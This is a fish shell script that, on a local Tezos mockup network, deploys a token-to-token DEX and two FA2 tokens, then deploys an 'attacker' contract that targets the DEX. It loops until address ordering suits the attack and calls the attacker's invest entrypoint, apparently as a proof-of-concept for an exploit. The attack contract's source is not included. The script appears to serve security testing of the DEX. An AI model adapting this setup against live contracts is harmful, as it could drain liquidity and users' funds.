#!/usr/bin/fish
# function mockup
#     /home/julian/Apps/tezos/carthagenet.sh client --mode mockup --base-dir /tmp/ $argv
# end

alias mockup-client='tezos-client --mode mockup --base-dir /tmp/mockup'

function contract_address
    mockup-client show known contract $argv
end

set alice "tz1ddb9NMYHZi5UzPdzTZMYQQZoMub195zgv" # bootsrap5
set bob "tz1b7tUupMgCNw2cCLpKTkSD1NZzB5TkP2sv" # bootsrap4

# ligo compile-contract ./contracts/Test.ligo main --output 
# if not test $status -eq 0
#     exit 1
# end

set initial_tt_storage 'record [
    storage=record [
        entered=False;
        pairs_count=0n;
        tokens=(big_map[] : big_map(nat, tokens_info));
        token_to_id=(big_map[] : big_map(token_pair, nat));
        pairs=(big_map[] : big_map(nat, pair_info));
        ledger=(big_map[] : big_map((address * nat), account_info));
    ];
    dex_lambdas=( big_map[] : big_map(nat, dex_func));
    metadata=( big_map[] : big_map(string, bytes));
    token_lambdas=( big_map[] : big_map(nat, token_func));
]'

set tt_storage (ligo compile-storage ./integration_tests/MockTTDex.ligo main (echo $initial_tt_storage | string collect))
# set src "ss"
mockup-client originate contract tt transferring 1 from bootstrap1 \
                        running ./integration_tests/MockTTDex.tz \
                        --init (echo $tt_storage) --burn-cap 10 --force

set tt_address (contract_address tt | string collect)


### deploy tokens ###

set token_fa2_storage "record [
    total_supply = 0n;
    ledger = (big_map[
        (\"$alice\" : address) -> record [
            balance = 10000000n;
            allowances = (set [] : set (address));
        ]
    ] : big_map (address, account));
    token_metadata = (big_map[]  : big_map (token_id, token_metadata_info));
    metadata = (big_map[]  : big_map(string, bytes));
]"

set tt_storage (ligo compile-storage ./contracts/main/TokenFA2.ligo main (echo $token_fa2_storage | string collect))

mockup-client originate contract token1 \
                transferring 0 from bootstrap1 \
                running ./compiled/token_fa2.tz \
                --init (echo $tt_storage)  --burn-cap 10 --force

mockup-client originate contract token2 \
                transferring 0 from bootstrap1 \
                running ./compiled/token_fa2.tz \
                --init (echo $tt_storage)  --burn-cap 10 --force

set token1_address (contract_address token1 | string collect)
set token2_address (contract_address token2 | string collect)

# forget contracts so we just use their address so they aren't swapped
mockup-client forget contract token1
mockup-client forget contract token2

echo "token1 $token1_address"
echo "token2 $token2_address"

# swap addresses in case of the wrong order
if expr $token1_address \> $token2_address
    # echo "swapping addresses"
    set intermediate $token1_address
    set token1_address $token2_address
    set token2_address $intermediate
    
    echo "after swapping"
    echo "token1 $token1_address"
    echo "token2 $token2_address"

end
sleep 5

# ### allow quipu to spend senders funds

set allow_ligo "Update_operators( list [
        Add_operator(record[
          owner = (\"$alice\" : address);
          operator = (\"$tt_address\" : address);
          token_id = 0n;
        ])
      ])"

# echo $allow_ligo
set allow_mich (ligo compile-parameter ./contracts/main/TokenFA2.ligo main (echo $allow_ligo | string collect))
echo $allow_mich

mockup-client call $token1_address from $alice \
                --burn-cap 10 \
                --arg (echo $allow_mich | string collect)
mockup-client call $token2_address from $alice \
                --burn-cap 10 \
                --arg (echo $allow_mich | string collect)

### initialize exchange ###

set init_arg_ligo "Use(InitializeExchange(record [
        pair = record [
            token_a_address = (\"$token1_address\" : address);
            token_b_address = (\"$token2_address\" : address);
            token_a_id = 0n;
            token_b_id = 0n;
            token_a_type = Fa2;
            token_b_type = Fa2;
        ];
        token_a_in = 100n;
        token_b_in = 100n;
    ]))"

set init_arg_mich (ligo compile-parameter ./contracts/main/TTDex.ligo main (echo $init_arg_ligo | string collect))

echo $init_arg_ligo | string collect
mockup-client call tt from $alice \
                --burn-cap 10 \
                --arg (echo $init_arg_mich | string collect)

# exit if wrong pair, just try again
if not test $status -eq 0
    exit 1
end

# echo "no failed"

### deploy an attacker ###
set attacker_storage_ligo "record [
  is_evil = False;
  shares_to_divest = 200n;
  victim_address = (\"$token1_address\" : address);
  quipuswap_address = (\"$tt_address\" : address);
]"

set attacker_storage_mich (ligo compile-storage ./attack.ligo main (echo $attacker_storage_ligo | string collect))

# five attempts to match token_a to be smaller than attacker address
for i in 1 2 3 4 5
    mockup-client originate contract attacker transferring 1 from bootstrap1 \
                            running ./attack.tz \
                            --burn-cap 10 --force \
                            --init (echo $attacker_storage_mich)
    if not test $status -eq 0
        exit 1
    end

    set attacker_address (contract_address attacker | string collect)

    set init_attacker_exchange_ligo "Use(InitializeExchange(record [
        pair = record [
            token_a_address = (\"$token1_address\" : address);
            token_b_address = (\"$attacker_address\" : address);
            token_a_id = 0n;
            token_b_id = 0n;
            token_a_type = Fa2;
            token_b_type = Fa2;
        ];
        token_a_in = 100n;
        token_b_in = 100n;
    ]))"

    set init_attacker_exchange_mich (ligo compile-parameter ./contracts/main/TTDex.ligo main (echo $init_attacker_exchange_ligo | string collect))

    mockup-client call $tt_address from $alice \
        --burn-cap 10 \
        --arg (echo $init_attacker_exchange_mich | string collect)
    
    if test $status -eq 0
        break
    end
end

mockup-client call $attacker_address  from bootstrap1 --entrypoint allow --arg "\"$token1_address\"" --burn-cap 1

mockup-client call $attacker_address  from bootstrap1 --entrypoint invest --arg "Pair (Pair 95 95) (Pair 95 \"$token1_address\")"